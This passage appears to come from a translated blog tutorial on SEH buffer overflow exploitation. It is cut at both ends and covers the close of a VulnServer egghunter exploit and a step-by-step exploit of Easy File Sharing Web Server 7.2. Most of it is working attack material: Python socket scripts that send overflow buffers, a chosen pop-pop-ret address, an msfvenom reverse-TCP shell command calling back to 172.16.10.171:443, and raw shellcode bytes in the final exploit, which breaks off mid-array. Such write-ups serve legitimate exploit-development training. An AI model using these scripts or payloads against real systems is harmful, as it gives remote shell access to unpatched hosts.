class="line">&quot;\x13\x69\x13\x9d\x2a\xa2\x66\xdc\x6b\xdf\x8b\x8c\x24\xab\x3e&quot;</span><br><span class="line">&quot;\x20\x40\xe1\x82\xcb\x1a\xe7\x82\x28\xea\x06\xa2\xff\x60\x51&quot;</span><br><span class="line">&quot;\x64\xfe\xa5\xe9\x2d\x18\xa9\xd4\xe4\x93\x19\xa2\xf6\x75\x50&quot;</span><br><span class="line">&quot;\x4b\x54\xb8\x5c\xbe\xa4\xfd\x5b\x21\xd3\xf7\x9f\xdc\xe4\xcc&quot;</span><br><span class="line">&quot;\xe2\x3a\x60\xd6\x45\xc8\xd2\x32\x77\x1d\x84\xb1\x7b\xea\xc2&quot;</span><br><span class="line">&quot;\x9d\x9f\xed\x07\x96\xa4\x66\xa6\x78\x2d\x3c\x8d\x5c\x75\xe6&quot;</span><br><span class="line">&quot;\xac\xc5\xd3\x49\xd0\x15\xbc\x36\x74\x5e\x51\x22\x05\x3d\x3e&quot;</span><br><span class="line">&quot;\x87\x24\xbd\xbe\x8f\x3f\xce\x8c\x10\x94\x58\xbd\xd9\x32\x9f&quot;</span><br><span class="line">&quot;\xc2\xf3\x83\x0f\x3d\xfc\xf3\x06\xfa\xa8\xa3\x30\x2b\xd1\x2f&quot;</span><br><span class="line">&quot;\xc0\xd4\x04\xff\x90\x7a\xf7\x40\x40\x3b\xa7\x28\x8a\xb4\x98&quot;</span><br><span class="line">&quot;\x49\xb5\x1e\xb1\xe0\x4c\xc9\x12\xe4\x44\xa2\x03\x07\x58\xb5&quot;</span><br><span class="line">&quot;\x68\x8e\xbe\xdf\x9e\xc7\x69\x48\x06\x42\xe1\xe9\xc7\x58\x8c&quot;</span><br><span class="line">&quot;\x2a\x43\x6f\x71\xe4\xa4\x1a\x61\x91\x44\x51\xdb\x34\x5a\x4f&quot;</span><br><span class="line">&quot;\x73\xda\xc9\x14\x83\x95\xf1\x82\xd4\xf2\xc4\xda\xb0\xee\x7f&quot;</span><br><span class="line">&quot;\x75\xa6\xf2\xe6\xbe\x62\x29\xdb\x41\x6b\xbc\x67\x66\x7b\x78&quot;</span><br><span class="line">&quot;\x67\x22\x2f\xd4\x3e\xfc\x99\x92\xe8\x4e\x73\x4d\x46\x19\x13&quot;</span><br><span class="line">&quot;\x08\xa4\x9a\x65\x15\xe1\x6c\x89\xa4\x5c\x29\xb6\x09\x09\xbd&quot;</span><br><span class="line">&quot;\xcf\x77\xa9\x42\x1a\x3c\xc9\xa0\x8e\x49\x62\x7d\x5b\xf0\xef&quot;</span><br><span class="line">&quot;\x7e\xb6\x37\x16\xfd\x32\xc8\xed\x1d\x37\xcd\xaa\x99\xa4\xbf&quot;</span><br><span class="line">&quot;\xa3\x4f\xca\x6c\xc3\x45&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (3515-len(egg + shellcode))</span><br><span class="line">print &quot;[*] Adding Egghunter tag &quot; + egg + &quot; alongside A Buffer&quot;</span><br><span class="line">buffer += egg</span><br><span class="line">buffer += shellcode</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += nseh</span><br><span class="line">print &quot;[*] Overwriting nSEH Value with &quot; + nseh</span><br><span class="line">buffer += seh #0x625010br pop,pop,ret</span><br><span class="line">print &quot;[*] Overwriting SEH Value with &quot; + seh</span><br><span class="line">buffer += eggnops</span><br><span class="line">buffer += egghunter</span><br><span class="line">junk = &quot;J&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure>

<p><code>443</code>假设我们有一个打开的监听器，我们将收到一个反向外壳-在这里值得注意的是，这<strong>只能</strong>在<code>Windows 7 x86</code>此工作是由于Egghunter启动系统调用的方式，即<code>INT 2E</code>-整个体系结构稍有不同，因此我们的<strong>mona</strong> Egghunter将仅在 <code>32 Bit</code></p>
<p>我决定创建此小图来从较高的角度表示漏洞，并尝试显示每个相关的跳转-我的visio技能不是很好，所以请问！</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162523.png" class="lozad"></p>
<h2 id="2-2-无需Egghunter的轻松文件共享Web服务器7-2"><a href="#2-2-无需Egghunter的轻松文件共享Web服务器7-2" class="headerlink" title="2.2 无需Egghunter的轻松文件共享Web服务器7.2"></a>2.2 无需Egghunter的轻松文件共享Web服务器7.2</h2><p>轻松文件共享Web服务器是Win XP / Win 7时代的遗留软件，它使访问者可以轻松地通过选择的Web浏览器轻松上传/下载文件，尽管它在被<strong>Stack Overflows</strong>充斥着众多漏洞时非常有用到<strong>SEH溢出</strong>。</p>
<h3 id="2-2-1-模糊和发现崩溃"><a href="#2-2-1-模糊和发现崩溃" class="headerlink" title="2.2.1 模糊和发现崩溃"></a>2.2.1 模糊和发现崩溃</h3><p>与之前的示例类似，我将<em>停留</em>在<em>模糊测试</em>阶段，因为我不想花费大量时间对每个输入/参数进行模糊测试，也就是说，在此示例中，我们将以<strong>HTTP</strong>协议为目标并<code>boozfuzz</code>支持<strong>HTTP</strong>模糊测试，因此请检查一下！我很快将只写一篇关于模糊测试和不同技术的文章。</p>
<p>由于该漏洞位于<strong>HTTP中，</strong>因此有几种方法可以使用python做到这一点，我们可以使用该<code>requests</code>库，也可以仅通过端口80连接并发送原始<strong>HTTP请求。</strong>-我将在此处输入Port 80 / Raw Requests，并可能<code>requests</code>在最后重写脚本。</p>
<p>首先让我们从一个基本的FUZZ脚本开始，直到发生崩溃为止，这里的漏洞位于<code>GET</code>变量内部，底层应用程序试图在其中获取传递的输入内容，<code>GET</code>并且无法进行边界检查和任何清理等操作。</p>
<p>这是一个示例示例，我们将使用python发送HTTP请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /m0chan.txtAAAAAAAAAbufferhereAAAAAAA HTTP/1.1</span><br><span class="line">Host: 172.16.10.15</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: SESSIONID=5905; UserID=; PassWD=</span><br><span class="line">If-Modified-Since: Fri, 11 May 2012 10:11:48 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>正如您在<strong>第1行上</strong>看到的那样，我们正在请求<code>m0chan.txt</code>旁边的缓冲区/图案。-让我们快速编写一些python脚本以使其变得更简单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 5000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure>

<p>一旦完成运行（只要我们已<code>EFSWS</code>打开<strong>Immunity</strong>和/或连接），我们就会注意到我们实际上造成了崩溃，让我们分析下面的屏幕截图，看看我们做了什么。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162544.png" class="lozad"></p>
<p>如您所见，在这种情况下，我们已经用用户提供的输入超出了<strong>nSEH</strong>和<strong>SEH</strong>的地址<code>AAAA</code> <code>41414141</code>-我们也对我们有些新的限制… <strong>EAX寄存器</strong> -如您所见，右上方<code>EAX</code>包含的<code>41414141</code>是我们的<code>A</code>缓冲区。-稍后可能会有用。</p>
<h3 id="2-2-2-寻找偏移"><a href="#2-2-2-寻找偏移" class="headerlink" title="2.2.2 寻找偏移"></a>2.2.2 寻找偏移</h3><p>现在，我们已经分析了崩溃并找到了<em>漏洞，</em>我们可以继续计算偏移量，并计算出使<code>A&#39;s</code>我们超出<strong>SEH</strong>和<strong>nSEH</strong>指针所需的时间。为此，我将通过以下命令使用<strong>mona</strong>来计算非重复字符串（也称为<strong>循环模式）</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 5000</span><br></pre></td></tr></table></figure>

<p>现在，我将<code>fuzzer.py</code>再次使用我的脚本并将其修改为发送我的模式<code>5000</code> <code>A&#39;s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6....&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure>

<p>我们的应用程序现在将返回崩溃状态并报告<strong>访问冲突，</strong>但是如果我们检查<strong>SEH Chain</strong>并跳转到堆栈上的<strong>SE Handler</strong>的值，我们将注意到它实际上已经超出了我们的循环模式，而不是一长串<code>A&#39;s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona po 3Ff4</span><br></pre></td></tr></table></figure>

<p>运行以上任一命令都将报告，超出<strong>nSEH</strong>值的偏移量是<strong>4061字节</strong> -我们现在可以修改漏洞利用以反映<code>&quot;A&quot; * 4061</code></p>
<p><img alt="img" data-src="https://i.imgur.com/KTyiqOU.png" class="lozad"></p>
<h3 id="2-2-3-寻找坏字符"><a href="#2-2-3-寻找坏字符" class="headerlink" title="2.2.3 寻找坏字符"></a>2.2.3 寻找坏字符</h3><p>在这里，我们将采用与上述相同的方法，在该方法中，我们将每个可能的字符发送到缓冲区旁边，并分析它们在内存转储中的显示方式-在此还值得注意的是，我们必须为<code>\n</code>＆排除字符，<code>\r</code>因为我们没有希望在我们的缓冲区旁边发送装盒返回和新行，以有效地分解原始<strong>HTTP请求</strong>。</p>
<p>我将在此处使用以下脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;C&quot;*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span><br><span class="line">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="line">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span><br><span class="line">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span><br><span class="line">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span><br><span class="line">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span><br><span class="line">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span><br><span class="line">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (4061-len(badchars))</span><br><span class="line">print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += badchars #All of badchars</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure>

<p>假设我们反复冲洗并找到内存转储中的所有无效字符，我们将找到所需的东西，在这种情况下，我的发现是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c</span><br></pre></td></tr></table></figure>

<h3 id="2-2-4-查找POP-POP-RET指令"><a href="#2-2-4-查找POP-POP-RET指令" class="headerlink" title="2.2.4 查找POP POP RET指令"></a>2.2.4 查找POP POP RET指令</h3><p>在本文中，我已经对此进行了广泛的介绍，因此，我将直接进入操作并找到包含<code>pop pop ret</code>指令的模块。</p>
<p>当然，我们将再次使用<strong>mona</strong>通过以下方便的命令来完成此操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure>

<p>当然，这里的目标是找到一个未经任何安全限制（例如<strong>ASLR</strong>，<strong>Safe SEH</strong>等）编译的模块。</p>
<p>您会注意到，在运行时，<code>!mona seh</code>它会在日志窗口中显示10个结果，但没有一个真正适合您，很容易在这里感到困惑，并开始怀疑是否还有要使用的模块。然而！如果检查<code>seh.txt</code>位于<strong>mona</strong>工作目录中的<code>.txt</code>文件，您会发现一个非常大的文件，其中包含数百个，甚至数千个可用模块。</p>
<p>以我为例，我滚动浏览了所有以开头的模块，<code>00</code>以避免无意中在缓冲区中实现流氓<strong>空字节</strong>。</p>
<p>我选择的选项是 <code>0x1000108b</code></p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162557.png" class="lozad"></p>
<p>现在，我将此值添加到我的python脚本中的<strong>SEH</strong>变量中，并执行它以验证我的想法是正确的，并且执行按预期进行。</p>
<p><strong>更新的Python脚本</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 4061</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #pop pop ret</span><br><span class="line">junk = &quot;D&quot;*(10000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure>

<p>执行后检查<strong>抗扰性</strong>显示<strong>SEH Handler</strong>现在已被我们的<code>pop pop ret</code>小工具（也称为<strong>1001ab99）</strong>的内存地址覆盖</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162608.png" class="lozad"></p>
<p>而且，如果我们不通过<strong>Shift + F9</strong>将异常传递给程序，则会将<strong>nSEH</strong><code>pop pop ret</code>的值和<strong>nSEH</strong>的值放置在<strong>EIP寄存器中以</strong>备执行。<strong>答对了！</strong></p>
<p>在这种情况下，<strong>053A6FAC</strong>是堆栈中<strong>nSEH</strong>的地址，因此我们执行此位置的任何内容都将被执行。如下面的屏幕截图所示。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162617.png" class="lozad"></p>
<h3 id="2-2-5-生成Shellcode"><a href="#2-2-5-生成Shellcode" class="headerlink" title="2.2.5 生成Shellcode"></a>2.2.5 生成Shellcode</h3><p>现在与VulnServer不同，在缓冲区<strong>之后</strong>我们可以使用的空间非常有限- 在这种情况下，精确到<strong>52字节</strong>，在我们的<strong>nSEH</strong>和<strong>SEH</strong>值之后，我们<strong>还有</strong>很多空间，精确到<strong>931字节</strong>。</p>
<p>现在，只要对我们的shell代码进行一点编码，我们就应该能够将我们的shellcode放在这里，并<code>Short JMP</code>在<strong>nSEH</strong>指针中添加一些代码直接跳入其中。</p>
<p>但是，首先让我们使用可信任的<strong>MSFVenom</strong>生成一些shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m0chan@kali:/&gt; msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c&quot;</span><br></pre></td></tr></table></figure>

<p>您可能会注意到，这次我选择了分段式负载，而无段式只是为了帮助减小负载大小。</p>
<h3 id="2-2-6-最终利用"><a href="#2-2-6-最终利用" class="headerlink" title="2.2.6 最终利用"></a>2.2.6 最终利用</h3><p>跳转到shell代码并执行最终的shellcode。为了安全起见，现在要做的所有工作就是将我们的shell代码<code>D</code>与一些缓冲区一起放在缓冲区中<code>NOPS</code>，并从<strong>nSEH</strong>执行<strong>6字节的</strong>跳转，该跳转将<strong>落入</strong>我们的NOP Sled并直接进入shellcode。</p>
<p>我们可以做到这一点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br></pre></td></tr></table></figure>

<p>现在我们的最终漏洞利用将如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br><span class="line">seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop ret</span><br><span class="line"></span><br><span class="line">#msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c&quot;</span><br><span class="line"></span><br><span class="line">shellcodenops = &quot;\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">&quot;\xbd\xe0\x3c\x1c\xcb\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;</span><br><span class="line">&quot;\x5b\x31\x6a\x14\x83\xea\xfc\x03\x6a\x10\x02\xc9\xe0\x23\x40&quot;</span><br><span class="line">&quot;\x32\x19\xb4\x24\xba\xfc\x85\x64\xd8\x75\xb5\x54\xaa\xd8\x3a&quot;</span><br><span class="line">&quot;\x1f\xfe\xc8\xc9\x6d\xd7\xff\x7a\xdb\x01\x31\x7a\x77\x71\x50&quot;</span><br><span class="line">&quot;\xf8\x85\xa6\xb2\xc1\x46\xbb\xb3\x06\xba\x36\xe1\xdf\xb1\xe5&quot;</span><br><span class="line">&quot;\x16\x6b\x8f\x35\x9c\x27\x1e\x3e\x41\xff\x21\x6f\xd4\x8b\x78&quot;</span><br><span class="line">&quot;\xaf\xd6\x58\xf1\xe6\xc0\xbd\x3f\xb0\x7b\x75\xb4\x43\xaa\x47&quot;</span><br><span class="line">&quot;\x35\xef\x93\x67\xc4\xf1\xd4\x40\x36\x84\x2c\xb3\xcb\x9f\xea&quot;</span><br><span class="line">&quot;\xc9\x17\x15\xe9\x6a\xdc\x8d\xd5\x8b\x31\x4b\x9d\x80\xfe\x1f&quot;</span><br><span class="line">&quot;\xf9\x84\x01\xf3\x71\xb0\x8a\xf2\x55\x30\xc8\xd0\x71\x18\x8b&quot;</span><br><span class="line">&quot;\x79\x23\xc4\x7a\x85\x33\xa7\x23\x23\x3f\x4a\x30\x5e\x62\x03&quot;</span><br><span 